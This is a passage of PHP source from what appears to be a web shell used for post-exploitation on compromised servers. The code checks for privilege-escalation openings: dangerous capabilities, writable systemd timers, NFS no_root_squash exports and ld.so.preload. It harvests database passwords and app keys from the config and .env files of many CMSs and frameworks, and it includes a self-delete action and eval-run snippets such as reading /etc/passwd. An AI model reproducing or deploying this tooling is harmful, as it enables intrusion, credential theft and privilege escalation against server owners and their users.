    $capNames = ['CAP_CHOWN', 'CAP_DAC_OVERRIDE', 'CAP_DAC_READ_SEARCH', 'CAP_FOWNER', 'CAP_FSETID', 'CAP_KILL', 'CAP_SETGID', 'CAP_SETUID', 'CAP_SETPCAP', 'CAP_LINUX_IMMUTABLE', 'CAP_NET_BIND_SERVICE', 'CAP_NET_BROADCAST', 'CAP_NET_ADMIN', 'CAP_NET_RAW', 'CAP_IPC_LOCK', 'CAP_IPC_OWNER', 'CAP_SYS_MODULE', 'CAP_SYS_RAWIO', 'CAP_SYS_CHROOT', 'CAP_SYS_PTRACE', 'CAP_SYS_PACCT', 'CAP_SYS_ADMIN', 'CAP_SYS_BOOT', 'CAP_SYS_NICE', 'CAP_SYS_RESOURCE', 'CAP_SYS_TIME', 'CAP_SYS_TTY_CONFIG', 'CAP_MKNOD', 'CAP_LEASE', 'CAP_AUDIT_WRITE', 'CAP_AUDIT_CONTROL', 'CAP_SETFCAP', 'CAP_MAC_OVERRIDE', 'CAP_MAC_ADMIN', 'CAP_SYSLOG', 'CAP_WAKE_ALARM', 'CAP_BLOCK_SUSPEND', 'CAP_AUDIT_READ', 'CAP_PERFMON', 'CAP_BPF', 'CAP_CHECKPOINT_RESTORE'];
    $dangerousCaps = ['CAP_SETUID' => 1, 'CAP_SYS_ADMIN' => 1, 'CAP_DAC_OVERRIDE' => 1, 'CAP_DAC_READ_SEARCH' => 1, 'CAP_SYS_PTRACE' => 1, 'CAP_NET_RAW' => 1, 'CAP_FOWNER' => 1, 'CAP_SYS_MODULE' => 1, 'CAP_SETGID' => 1, 'CAP_CHOWN' => 1];
    $capabilities = [];
    $selfStatus = @file_get_contents('/proc/self/status') ?: '';
    foreach (['CapInh', 'CapPrm', 'CapEff', 'CapBnd', 'CapAmb'] as $ct) {
        if (preg_match('/^' . $ct . ':\s+([0-9a-f]+)/m', $selfStatus, $cm)) {
            $hexVal = $cm[1];
            $intVal = hexdec($hexVal);
            $decoded = [];
            for ($i = 0; $i < count($capNames); $i++) {
                if ($intVal & (1 << $i))
                    $decoded[] = $capNames[$i];
            }
            $capabilities[$ct] = ['hex' => $hexVal, 'caps' => $decoded];
        }
    }

    // --- 7. Kernel info ---
    $kernelInfo = [
        'release' => php_uname('r'),
        'arch' => php_uname('m'),
        'proc_version' => @file_get_contents('/proc/version') ?: '',
        'aslr' => @file_get_contents('/proc/sys/kernel/randomize_va_space'),
    ];
    if ($kernelInfo['aslr'] !== false)
        $kernelInfo['aslr'] = trim($kernelInfo['aslr']);

    // --- 8. Security modules ---
    $securityModules = ['selinux' => ['present' => false, 'enforcing' => null], 'apparmor' => ['present' => false, 'profiles_count' => 0], 'seccomp' => null];
    if (@file_exists('/sys/fs/selinux')) {
        $securityModules['selinux']['present'] = true;
        $enf = @file_get_contents('/sys/fs/selinux/enforce');
        if ($enf !== false)
            $securityModules['selinux']['enforcing'] = (int) trim($enf);
    }
    if (@file_exists('/sys/module/apparmor')) {
        $securityModules['apparmor']['present'] = true;
        $profs = @file_get_contents('/sys/kernel/security/apparmor/profiles');
        if ($profs)
            $securityModules['apparmor']['profiles_count'] = substr_count($profs, "\n");
    }
    if (preg_match('/^Seccomp:\s+(\d+)/m', $selfStatus, $sm)) {
        $securityModules['seccomp'] = (int) $sm[1];
    }

    // --- 9. LD_PRELOAD ---
    $ldPreload = [
        'exists' => @file_exists('/etc/ld.so.preload'),
        'writable' => @is_writable('/etc/ld.so.preload'),
        'content' => null,
        'env_value' => getenv('LD_PRELOAD') ?: null,
    ];
    if ($ldPreload['exists']) {
        $ldc = @file_get_contents('/etc/ld.so.preload', false, null, 0, 4096);
        if ($ldc !== false)
            $ldPreload['content'] = $ldc;
    }

    // --- 10. NFS exports ---
    $nfsExports = ['readable' => false, 'content' => null, 'no_root_squash' => []];
    $nfsContent = @file_get_contents('/etc/exports', false, null, 0, 8192);
    if ($nfsContent !== false) {
        $nfsExports['readable'] = true;
        $nfsExports['content'] = $nfsContent;
        foreach (explode("\n", $nfsContent) as $nfsLine) {
            if (stripos($nfsLine, 'no_root_squash') !== false) {
                $nfsExports['no_root_squash'][] = trim($nfsLine);
            }
        }
    }

    // --- 11. Systemd timers ---
    $systemdTimers = [];
    foreach (array_merge(@glob('/etc/systemd/system/*.timer') ?: [], @glob('/usr/lib/systemd/system/*.timer') ?: []) as $timerPath) {
        $timerContent = @file_get_contents($timerPath, false, null, 0, 4096);
        $entry = ['timer_path' => $timerPath, 'timer_writable' => @is_writable($timerPath), 'service_path' => null, 'exec_start' => null, 'exec_writable' => null];
        // Find matching .service
        $svcPath = preg_replace('/\.timer$/', '.service', $timerPath);
        if (@is_readable($svcPath)) {
            $entry['service_path'] = $svcPath;
            $svcContent = @file_get_contents($svcPath, false, null, 0, 4096);
            if ($svcContent && preg_match('/^ExecStart\s*=\s*(.+)/m', $svcContent, $em)) {
                $execBin = preg_split('/\s+/', trim($em[1]))[0];
                // Strip systemd prefixes like - or + or !
                $execBin = ltrim($execBin, '-+!@');
                $entry['exec_start'] = $execBin;
                $entry['exec_writable'] = @is_writable($execBin);
            }
        }
        $systemdTimers[] = $entry;
    }

    // --- 12. Extended credential files ---
    $credentialFiles = [];
    $credPaths = [
        '/root/.my.cnf',
        '/etc/mysql/debian.cnf',
        '/home/*/.my.cnf',
        '/root/.pgpass',
        '/home/*/.pgpass',
    ];
    // Web framework configs
    $cwd = getcwd() ?: '';
    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
    foreach ([$cwd, $docRoot, '/var/www/html', '/var/www'] as $base) {
        if (!$base)
            continue;
        $credPaths[] = $base . '/wp-config.php';
        $credPaths[] = $base . '/config/database.php';
        $credPaths[] = $base . '/config/database.yml';
        $credPaths[] = $base . '/app/config/parameters.yml';
        $credPaths[] = $base . '/../wp-config.php';
    }
    foreach ($credPaths as $pattern) {
        foreach (@glob($pattern) ?: [$pattern] as $cf) {
            $cc = @file_get_contents($cf, false, null, 0, 8192);
            if ($cc !== false)
                $credentialFiles[$cf] = $cc;
        }
    }

    // --- 13. Backup file scan ---
    $backupFiles = [];
    $backupPatterns = [];
    foreach ([$cwd, $docRoot] as $base) {
        if (!$base)
            continue;
        $backupPatterns[] = $base . '/*.{bak,old,sql,sql.gz,conf,cfg,swp}';
        $backupPatterns[] = $base . '/../*.{sql,sql.gz,bak}';
    }
    $backupPatterns[] = '/var/www/html/wp-config.php.bak';
    $backupPatterns[] = '/var/www/*/wp-config.php.bak';
    foreach ($backupPatterns as $pattern) {
        foreach (@glob($pattern, GLOB_BRACE | GLOB_NOSORT) ?: [] as $bf) {
            if (@is_file($bf)) {
                $backupFiles[] = ['path' => $bf, 'size' => @filesize($bf) ?: 0, 'readable' => @is_readable($bf)];
            }
        }
    }

    // --- Installed panel / hosting ---
    $panels = [
        'cPanel' => '/usr/local/cpanel',
        'Plesk' => '/usr/local/psa',
        'DirectAdmin' => '/usr/local/directadmin',
        'HestiaCP' => '/usr/local/hestia',
        'VestaCP' => '/usr/local/vesta',
        'ISPConfig' => '/usr/local/ispconfig',
        'CyberPanel' => '/usr/local/CyberPanel',
        'CloudPanel' => '/home/clp',
        'Webmin' => '/usr/share/webmin',
        'Virtualmin' => '/usr/share/webmin/virtual-server',
        'Froxlor' => '/var/www/froxlor',
        'KeyHelp' => '/home/keyhelp',
        'AMPPS' => '/usr/local/ampps',
        'Zend Server' => '/usr/local/zend',
        'GridPane' => '/opt/gridpane',
        'Moss' => '/opt/moss',
        'RunCloud' => '/etc/runcloud',
        'ServerPilot' => '/etc/serverpilot',
        'Laravel Forge' => '/etc/forge',
    ];
    $detectedPanels = [];
    if (@file_exists('/www/server/panel')) {
        $btConf = @file_get_contents('/www/server/panel/config/config.json') ?: '';
        $detectedPanels[] = (strpos($btConf, '"language":"en"') !== false || @file_exists('/www/server/panel/BTPanel/static/language/en.json'))
            ? 'aaPanel (/www/server/panel)'
            : 'BT Panel (/www/server/panel)';
    }
    foreach ($panels as $name => $path) {
        if (@file_exists($path))
            $detectedPanels[] = $name . ' (' . $path . ')';
    }

    // --- .env file contents ---
    $envContents = [];
    $envPaths = array_unique(array_filter([
        $cwd . '/.env',
        $cwd . '/../.env',
        $cwd . '/.env.local',
        $cwd . '/.env.production',
        $docRoot . '/.env',
        $docRoot . '/../.env',
        '/var/www/.env',
        '/var/www/html/.env',
        '/var/www/html/../.env',
        '/home/*/public_html/.env',
        '/home/*/htdocs/.env',
        '/www/wwwroot/*/.env',
        '/srv/www/*/.env',
        '/opt/*/shared/.env',
    ]));
    $envSearch = [];
    foreach ($envPaths as $pattern) {
        foreach (@glob($pattern) ?: [$pattern] as $f) {
            $envSearch[] = $f;
        }
    }
    foreach (array_unique($envSearch) as $ef) {
        $content = @file_get_contents($ef, false, null, 0, 8192);
        if ($content)
            $envContents[$ef] = $content;
    }

    // --- Session save path & session files ---
    $sessionInfo = [];
    $sessRaw = ini_get('session.save_path') ?: '';
    $sessResult = shells_x_parse_session_save_path($sessRaw);
    $sessResolved = isset($sessResult['error']) ? null : $sessResult['path'];
    $sessDirExists = $sessResolved !== null && is_dir($sessResolved);
    $sessDirWritable = $sessDirExists && @is_writable($sessResolved);
    $sessionFiles = [];
    if ($sessDirExists) {
        $matches = @glob($sessResolved . '/sess_*') ?: [];
        foreach (array_slice($matches, 0, 200) as $sf) {
            $sessionFiles[] = [
                'path' => $sf,
                'size' => @filesize($sf) ?: 0,
                'mtime' => @filemtime($sf) ?: null,
                'readable' => @is_readable($sf),
                'writable' => @is_writable($sf),
            ];
        }
    }
    $sessionInfo = [
        'ini_value' => $sessRaw,
        'resolved_path' => $sessResolved,
        'exists' => $sessDirExists,
        'writable' => $sessDirWritable,
        'files_sample' => $sessionFiles,
    ];

    // --- Framework / CMS detection ---
    $frameworks = [];
    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
    $searchRoots = array_unique(array_filter([$docRoot, getcwd(), dirname($docRoot)]));

    // Helper: try to read a file and extract a version pattern
    $__fwReadVer = function ($path, $pattern) {
        $content = @file_get_contents($path, false, null, 0, 16384);
        if (!$content)
            return null;
        if (preg_match($pattern, $content, $m))
            return $m[1];
        return null;
    };

    // Helper: check file exists relative to any search root
    $__fwFind = function ($relPath) use ($searchRoots) {
        foreach ($searchRoots as $root) {
            $full = rtrim($root, '/') . '/' . ltrim($relPath, '/');
            if (@file_exists($full))
                return $full;
        }
        return null;
    };

    $__fwHas = function ($relPath) use ($__fwFind) {
        return $__fwFind($relPath) !== null;
    };

    // WordPress
    if ($p = $__fwFind('wp-includes/version.php')) {
        $ver = $__fwReadVer($p, '/\\$wp_version\\s*=\\s*[\'"]([^\'"]+)/');
        $fw = ['name' => 'WordPress', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('wp-config.php')) {
            $fw['config_path'] = $cp;
            $wpc = @file_get_contents($cp, false, null, 0, 16384);
            if ($wpc) {
                if (preg_match("/define\\s*\\(\\s*['\"]DB_NAME['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m))
                    $fw['details']['db_name'] = $m[1];
                if (preg_match("/define\\s*\\(\\s*['\"]DB_USER['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m))
                    $fw['details']['db_user'] = $m[1];
                if (preg_match("/define\\s*\\(\\s*['\"]DB_PASSWORD['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m))
                    $fw['details']['db_pass'] = $m[1];
                if (preg_match("/define\\s*\\(\\s*['\"]DB_HOST['\"]\\s*,\\s*['\"]([^'\"]*)/", $wpc, $m))
                    $fw['details']['db_host'] = $m[1];
                if (preg_match("/\\$table_prefix\\s*=\\s*['\"]([^'\"]*)/", $wpc, $m))
                    $fw['details']['table_prefix'] = $m[1];
                $fw['details']['debug'] = (stripos($wpc, "'WP_DEBUG', true") !== false || stripos($wpc, "'WP_DEBUG',true") !== false) ? 'enabled' : 'disabled';
            }
        }
        if ($plugDir = $__fwFind('wp-content/plugins'))
            $fw['details']['plugins'] = count(@scandir($plugDir) ?: []) - 2;
        if ($themeDir = $__fwFind('wp-content/themes'))
            $fw['details']['themes'] = count(@scandir($themeDir) ?: []) - 2;
        $fw['details']['admin_path'] = '/wp-admin/';
        $frameworks[] = $fw;
    }

    // Laravel
    if ($p = $__fwFind('artisan')) {
        $ver = null;
        $appFile = $__fwFind('vendor/laravel/framework/src/Illuminate/Foundation/Application.php');
        if ($appFile)
            $ver = $__fwReadVer($appFile, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
        $fw = ['name' => 'Laravel', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($envFile = $__fwFind('.env')) {
            $fw['config_path'] = $envFile;
            $env = @file_get_contents($envFile, false, null, 0, 8192);
            if ($env) {
                if (preg_match('/^DB_DATABASE=(.*)$/m', $env, $m))
                    $fw['details']['db_name'] = trim($m[1]);
                if (preg_match('/^DB_USERNAME=(.*)$/m', $env, $m))
                    $fw['details']['db_user'] = trim($m[1]);
                if (preg_match('/^DB_PASSWORD=(.*)$/m', $env, $m))
                    $fw['details']['db_pass'] = trim($m[1]);
                if (preg_match('/^DB_HOST=(.*)$/m', $env, $m))
                    $fw['details']['db_host'] = trim($m[1]);
                if (preg_match('/^DB_CONNECTION=(.*)$/m', $env, $m))
                    $fw['details']['db_driver'] = trim($m[1]);
                if (preg_match('/^APP_DEBUG=(.*)$/m', $env, $m))
                    $fw['details']['debug'] = strtolower(trim($m[1])) === 'true' ? 'enabled' : 'disabled';
                if (preg_match('/^APP_KEY=(.*)$/m', $env, $m))
                    $fw['details']['app_key'] = trim($m[1]);
            }
        }
        if ($storageLog = $__fwFind('storage/logs/laravel.log'))
            $fw['details']['log_file'] = $storageLog;
        $frameworks[] = $fw;
    }

    // Joomla
    if ($p = $__fwFind('libraries/src/Version.php')) {
        $ver = $__fwReadVer($p, "/MAJOR_VERSION\\s*=\\s*(\\d+)/");
        $minVer = $__fwReadVer($p, "/MINOR_VERSION\\s*=\\s*(\\d+)/");
        $patchVer = $__fwReadVer($p, "/PATCH_VERSION\\s*=\\s*(\\d+)/");
        if ($ver && $minVer)
            $ver = $ver . '.' . $minVer . ($patchVer ? '.' . $patchVer : '');
        $fw = ['name' => 'Joomla', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('configuration.php')) {
            $fw['config_path'] = $cp;
            $jc = @file_get_contents($cp, false, null, 0, 16384);
            if ($jc) {
                if (preg_match("/\\$db\\s*=\\s*['\"]([^'\"]*)/", $jc, $m))
                    $fw['details']['db_name'] = $m[1];
                if (preg_match("/\\$user\\s*=\\s*['\"]([^'\"]*)/", $jc, $m))
                    $fw['details']['db_user'] = $m[1];
                if (preg_match("/\\$password\\s*=\\s*['\"]([^'\"]*)/", $jc, $m))
                    $fw['details']['db_pass'] = $m[1];
                if (preg_match("/\\$host\\s*=\\s*['\"]([^'\"]*)/", $jc, $m))
                    $fw['details']['db_host'] = $m[1];
                if (preg_match("/\\$dbprefix\\s*=\\s*['\"]([^'\"]*)/", $jc, $m))
                    $fw['details']['table_prefix'] = $m[1];
                $fw['details']['debug'] = (preg_match("/\\$debug\\s*=\\s*['\"]?1/", $jc)) ? 'enabled' : 'disabled';
            }
        }
        $fw['details']['admin_path'] = '/administrator/';
        $frameworks[] = $fw;
    }

    // Drupal
    if ($p = $__fwFind('core/lib/Drupal.php')) {
        $ver = $__fwReadVer($p, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
        $fw = ['name' => 'Drupal', 'version' => $ver, 'config_path' => null, 'details' => []];
        $settingsFile = $__fwFind('sites/default/settings.php');
        if ($settingsFile) {
            $fw['config_path'] = $settingsFile;
            $fw['details']['admin_path'] = '/admin/';
        }
        $frameworks[] = $fw;
    }

    // Symfony
    if ($p = $__fwFind('vendor/symfony/http-kernel/Kernel.php')) {
        $ver = $__fwReadVer($p, "/const\\s+VERSION\\s*=\\s*['\"]([^'\"]+)/");
        $fw = ['name' => 'Symfony', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($envFile = $__fwFind('.env')) {
            $fw['config_path'] = $envFile;
            $env = @file_get_contents($envFile, false, null, 0, 8192);
            if ($env && preg_match('/^DATABASE_URL=(.*)$/m', $env, $m)) {
                $fw['details']['database_url'] = trim($m[1]);
            }
            if ($env && preg_match('/^APP_ENV=(.*)$/m', $env, $m))
                $fw['details']['app_env'] = trim($m[1]);
            if ($env && preg_match('/^APP_DEBUG=(.*)$/m', $env, $m))
                $fw['details']['debug'] = strtolower(trim($m[1])) === '1' ? 'enabled' : 'disabled';
        }
        $frameworks[] = $fw;
    }

    // CodeIgniter 4
    if ($p = $__fwFind('vendor/codeigniter4/framework/system/CodeIgniter.php')) {
        $ver = $__fwReadVer($p, "/const\\s+CI_VERSION\\s*=\\s*['\"]([^'\"]+)/");
        $fw = ['name' => 'CodeIgniter', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($envFile = $__fwFind('.env'))
            $fw['config_path'] = $envFile;
        $frameworks[] = $fw;
    }

    // Magento
    if ($p = $__fwFind('app/Mage.php')) {
        $ver = $__fwReadVer($p, "/getVersion[^}]*return\\s*['\"]([^'\"]+)/s");
        $fw = ['name' => 'Magento 1', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('app/etc/local.xml'))
            $fw['config_path'] = $cp;
        $fw['details']['admin_path'] = '/admin/';
        $frameworks[] = $fw;
    } elseif ($p = $__fwFind('vendor/magento/framework/AppInterface.php')) {
        $ver = $__fwReadVer($p, "/VERSION\\s*=\\s*['\"]([^'\"]+)/");
        $fw = ['name' => 'Magento 2', 'version' => $ver, 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('app/etc/env.php')) {
            $fw['config_path'] = $cp;
            $mc = @file_get_contents($cp, false, null, 0, 16384);
            if ($mc) {
                if (preg_match("/'dbname'\\s*=>\\s*'([^']*)/", $mc, $m))
                    $fw['details']['db_name'] = $m[1];
                if (preg_match("/'username'\\s*=>\\s*'([^']*)/", $mc, $m))
                    $fw['details']['db_user'] = $m[1];
                if (preg_match("/'password'\\s*=>\\s*'([^']*)/", $mc, $m))
                    $fw['details']['db_pass'] = $m[1];
                if (preg_match("/'host'\\s*=>\\s*'([^']*)/", $mc, $m))
                    $fw['details']['db_host'] = $m[1];
            }
        }
        $frameworks[] = $fw;
    }

    // PrestaShop
    if ($p = $__fwFind('config/settings.inc.php')) {
        $ver = $__fwReadVer($p, "/_PS_VERSION_.*?['\"]([\\d.]+)/");
        $fw = ['name' => 'PrestaShop', 'version' => $ver, 'config_path' => $p, 'details' => []];
        $psc = @file_get_contents($p, false, null, 0, 8192);
        if ($psc) {
            if (preg_match("/_DB_NAME_.*?['\"]([^'\"]+)/", $psc, $m))
                $fw['details']['db_name'] = $m[1];
            if (preg_match("/_DB_USER_.*?['\"]([^'\"]+)/", $psc, $m))
                $fw['details']['db_user'] = $m[1];
            if (preg_match("/_DB_PASSWD_.*?['\"]([^'\"]+)/", $psc, $m))
                $fw['details']['db_pass'] = $m[1];
            if (preg_match("/_DB_SERVER_.*?['\"]([^'\"]+)/", $psc, $m))
                $fw['details']['db_host'] = $m[1];
        }
        $frameworks[] = $fw;
    }

    // NextCloud / OwnCloud
    if ($p = $__fwFind('version.php')) {
        $vc = @file_get_contents($p, false, null, 0, 4096);
        if ($vc && (stripos($vc, 'Nextcloud') !== false || stripos($vc, 'OwnCloud') !== false || preg_match('/\\$OC_/', $vc))) {
            $name = (stripos($vc, 'Nextcloud') !== false) ? 'Nextcloud' : 'OwnCloud';
            $ver = null;
            if (preg_match('/\\$OC_VersionString\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m))
                $ver = $m[1];
            $hasConfig = $__fwHas('config/config.php');
            $hasOcLib = $__fwHas('lib/private/legacy/OC_Util.php') || $__fwHas('lib/private/legacy/OC_App.php') || $__fwHas('lib/private/URLGenerator.php');
            if ($hasConfig || $hasOcLib) {
                $fw = ['name' => $name, 'version' => $ver, 'config_path' => null, 'details' => []];
                if ($cp = $__fwFind('config/config.php')) {
                    $fw['config_path'] = $cp;
                    $nc = @file_get_contents($cp, false, null, 0, 16384);
                    if ($nc) {
                        if (preg_match("/'dbname'\\s*=>\\s*'([^']*)/", $nc, $m))
                            $fw['details']['db_name'] = $m[1];
                        if (preg_match("/'dbuser'\\s*=>\\s*'([^']*)/", $nc, $m))
                            $fw['details']['db_user'] = $m[1];
                        if (preg_match("/'dbpassword'\\s*=>\\s*'([^']*)/", $nc, $m))
                            $fw['details']['db_pass'] = $m[1];
                        if (preg_match("/'dbhost'\\s*=>\\s*'([^']*)/", $nc, $m))
                            $fw['details']['db_host'] = $m[1];
                    }
                }
                $frameworks[] = $fw;
            }
        }
    }

    // phpBB
    if ($p = $__fwFind('includes/constants.php')) {
        $ver = $__fwReadVer($p, "/PHPBB_VERSION.*?['\"]([\\d.]+)/");
        if ($ver) {
            $fw = ['name' => 'phpBB', 'version' => $ver, 'config_path' => null, 'details' => []];
            if ($cp = $__fwFind('config.php')) {
                $fw['config_path'] = $cp;
                $pc = @file_get_contents($cp, false, null, 0, 8192);
                if ($pc) {
                    if (preg_match("/dbname.*?['\"]([^'\"]+)/", $pc, $m))
                        $fw['details']['db_name'] = $m[1];
                    if (preg_match("/dbuser.*?['\"]([^'\"]+)/", $pc, $m))
                        $fw['details']['db_user'] = $m[1];
                    if (preg_match("/dbpasswd.*?['\"]([^'\"]+)/", $pc, $m))
                        $fw['details']['db_pass'] = $m[1];
                    if (preg_match("/dbhost.*?['\"]([^'\"]+)/", $pc, $m))
                        $fw['details']['db_host'] = $m[1];
                }
            }
            $fw['details']['admin_path'] = '/adm/';
            $frameworks[] = $fw;
        }
    }

    // MediaWiki
    if ($p = $__fwFind('includes/DefaultSettings.php')) {
        $ver = $__fwReadVer($p, "/\\$wgVersion\\s*=\\s*['\"]([^'\"]+)/");
        if ($ver) {
            $fw = ['name' => 'MediaWiki', 'version' => $ver, 'config_path' => null, 'details' => []];
            if ($cp = $__fwFind('LocalSettings.php')) {
                $fw['config_path'] = $cp;
                $mw = @file_get_contents($cp, false, null, 0, 16384);
                if ($mw) {
                    if (preg_match("/\\$wgDBname\\s*=\\s*['\"]([^'\"]+)/", $mw, $m))
                        $fw['details']['db_name'] = $m[1];
                    if (preg_match("/\\$wgDBuser\\s*=\\s*['\"]([^'\"]+)/", $mw, $m))
                        $fw['details']['db_user'] = $m[1];
                    if (preg_match("/\\$wgDBpassword\\s*=\\s*['\"]([^'\"]+)/", $mw, $m))
                        $fw['details']['db_pass'] = $m[1];
                    if (preg_match("/\\$wgDBserver\\s*=\\s*['\"]([^'\"]+)/", $mw, $m))
                        $fw['details']['db_host'] = $m[1];
                }
            }
            $frameworks[] = $fw;
        }
    }

    // Moodle
    if ($p = $__fwFind('version.php')) {
        $vc = @file_get_contents($p, false, null, 0, 4096);
        if ($vc && preg_match('/\\$release\\s*=\\s*[\'"]([^\'"]+)/', $vc, $m) && stripos($m[1], 'Moodle') !== false && ($cp = $__fwFind('config.php'))) {
            $fw = ['name' => 'Moodle', 'version' => $m[1], 'config_path' => $cp, 'details' => []];
            $mc = @file_get_contents($cp, false, null, 0, 8192);
            if ($mc) {
                if (preg_match("/\$CFG->dbname\s*=\s*['\"]([^'\"]+)/", $mc, $m))
                    $fw['details']['db_name'] = $m[1];
                if (preg_match("/\$CFG->dbuser\s*=\s*['\"]([^'\"]+)/", $mc, $m))
                    $fw['details']['db_user'] = $m[1];
                if (preg_match("/\$CFG->dbpass\s*=\s*['\"]([^'\"]+)/", $mc, $m))
                    $fw['details']['db_pass'] = $m[1];
                if (preg_match("/\$CFG->dbhost\s*=\s*['\"]([^'\"]+)/", $mc, $m))
                    $fw['details']['db_host'] = $m[1];
                if (preg_match("/\$CFG->wwwroot\s*=\s*['\"]([^'\"]+)/", $mc, $m))
                    $fw['details']['wwwroot'] = $m[1];
                if (preg_match("/\$CFG->dataroot\s*=\s*['\"]([^'\"]+)/", $mc, $m))
                    $fw['details']['dataroot'] = $m[1];
            }
            $frameworks[] = $fw;
        }
    }

    // CakePHP
    if ($p = $__fwFind('vendor/cakephp/cakephp/VERSION.txt')) {
        $ver = trim(@file_get_contents($p, false, null, 0, 64) ?: '');
        $fw = ['name' => 'CakePHP', 'version' => $ver ?: null, 'config_path' => null, 'details' => []];
        if ($cp = $__fwFind('config/app_local.php'))
            $fw['config_path'] = $cp;
        elseif ($cp = $__fwFind('config/app.php'))
            $fw['config_path'] = $cp;
        $frameworks[] = $fw;
    }

    // Yii2
    if ($p = $__fwFind('vendor/yiisoft/yii2/BaseYii.php')) {
        $ver = $__fwReadVer($p, "/getVersion[^}]*return\\s*['\"]([^'\"]+)/s");
        $fw = ['name' => 'Yii2', 'version' => $ver, 'config_path' => null, 'details' => []];
        $frameworks[] = $fw;
    }

    // --- Assemble response ---
    // target_ip / target_host / webshell_path are needed by the Faraday export
    // module so it can attribute findings to a canonical Host entity even when
    // the operator hasn't manually configured one. Cheap to compute; useful
    // independently for the diagnostics UI too.
    $__diag = [
        'php_version' => phpversion(),
        'os' => php_uname(),
        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'target_ip' => $bindIp ?: ($_SERVER['SERVER_ADDR'] ?? ''),
        'target_host' => $_SERVER['SERVER_NAME'] ?? ($_SERVER['HTTP_HOST'] ?? ''),
        'webshell_path' => $_SERVER['SCRIPT_FILENAME'] ?? __FILE__,
        'disable_functions' => ini_get('disable_functions') ?: 'none',
        'open_basedir' => ini_get('open_basedir') ?: 'none',
        'max_execution_time' => ini_get('max_execution_time') ?: '0',
        'allow_url_fopen' => ini_get('allow_url_fopen'),
        'sendmail_path' => ini_get('sendmail_path') ?: 'none',
        'user' => get_current_user(),
        'uid' => $uid,
        'gid' => $gid,
        'user_name' => $pwent['name'] ?? '?',
        'group_name' => $grent['name'] ?? '?',
        'groups' => implode(', ', $groupNames),
        'cwd' => getcwd() ?: '?',
        'disk_free' => @disk_free_space('.') ?: 0,
        'disk_total' => @disk_total_space('.') ?: 0,
        'functions' => $funcs,
        'extensions' => $extList,
        'passwd_users' => $passwdUsers,
        'group_memberships' => $groupMemberships,
        'processes' => $processes,
        'container' => $container,
        'network_ifaces' => $ifaceAddrs,
        'default_gateway' => $defaultGateway,
        'upstream_hosts' => $upstreamHosts,
        'arp_hosts' => $arpHosts,
        'open_ports' => $openPorts,
        'routes' => $routes,
        'readable_files' => $readable,
        'bin_dirs' => $binDirs,
        'writable_dirs' => $writableDirs,
        'all_binaries' => $allBinaries,
        'interpreters' => $availInterpreters,
        'tools' => $availTools,
        'panels' => $detectedPanels,
        'env_files' => $envContents,
        // Privesc checks
        'suid_binaries' => $suidBinaries,
        'cron_jobs' => $cronJobs,
        'sudo_config' => $sudoConfig,
        'docker_socket' => $dockerSocket,
        'mounts' => $mounts,
        'capabilities' => $capabilities,
        'kernel_info' => $kernelInfo,
        'security_modules' => $securityModules,
        'ld_preload' => $ldPreload,
        'nfs_exports' => $nfsExports,
        'systemd_timers' => $systemdTimers,
        'credential_files' => $credentialFiles,
        'backup_files' => $backupFiles,
        'frameworks' => $frameworks,
        'session' => $sessionInfo,
    ];
    $__jflags = (defined('JSON_INVALID_UTF8_SUBSTITUTE') ? JSON_INVALID_UTF8_SUBSTITUTE : 0) | (defined('JSON_PARTIAL_OUTPUT_ON_ERROR') ? JSON_PARTIAL_OUTPUT_ON_ERROR : 0);
    $__out = json_encode($__diag, $__jflags);
    if ($__out === false)
        $__out = json_encode(['error' => 'JSON encode failed: ' . json_last_error_msg()]);
    echo $__out;
    exit;
}
if (isset($_POST['action']) && $_POST['action'] === 'destruct') {
    if (ob_get_level() > 0) {
        ob_end_clean();
    }
    header('Content-Type: application/json');
    $file = __FILE__;
    $ok = @unlink($file);
    if (session_status() === PHP_SESSION_ACTIVE) {
        session_destroy();
    }
    echo json_encode(['ok' => $ok, 'destroyed' => $ok]);
    exit;
}
// Inlined at build time — must assign, not return (top-level return would exit the shell).
// AJAX actions never render the HTML template, so the array would just be allocated
// and thrown away on every poll. Limit construction to the page-render path.
//
// Escape rule for snippet bodies:
//   Snippets travel nowdoc → json_encode → JS string → operator runs them in PHP eval.
//   Inside nowdoc (<<<'PHP') backslashes are literal. So:
//     `\\n` here  →  JSON `"\\\\n"`  →  JS `"\\n"`  →  PHP eval sees `\n`  →  newline at runtime.
//     `\n`  here  →  JSON `"\\n"`    →  JS real newline  →  PHP eval sees real newline char.
//   The first form is usually what you want (matches how you'd write a PHP string literal).
if (!isset($_POST['action'])) {
$TERMINAL_SNIPPETS = [
        'php' => [
                [
                        'scandir',
                        <<<'PHP'
print_r(scandir('.'));
PHP
                ],

                [
                        '/etc/passwd',
                        <<<'PHP'
echo file_get_contents('/etc/passwd');
PHP
                ],

                [
                        'phpinfo',
                        <<<'PHP'
phpinfo();
PHP
                ],

                [
                        'uname',
                        <<<'PHP'
echo php_uname();
PHP
                ],

                [
                        'traceroute',
                        <<<'PHP'
// Edit IP_HERE and the port, then run. Returns hop count to that service —
// compare two ports on the same IP: same TTL = service on host, higher TTL = DNAT/port-forward.
$ip='IP_HERE'; $port=80; $max=30; $timeout=2;
if (!extension_loaded('sockets')) { echo "needs PHP sockets extension\\n"; return; }
// Accept hostname or IP; bail clean on garbage so we don't misreport TTL=1.
if (!filter_var($ip, FILTER_VALIDATE_IP)) {
  $r = gethostbyname($ip);
  if ($r === $ip || !filter_var($r, FILTER_VALIDATE_IP)) { echo "can't resolve '$ip'\\n"; return; }
  $ip = $r;
}
// PHP sockets ext doesn't expose IP_TTL as a named constant; 2 = Linux, 4 = BSD.
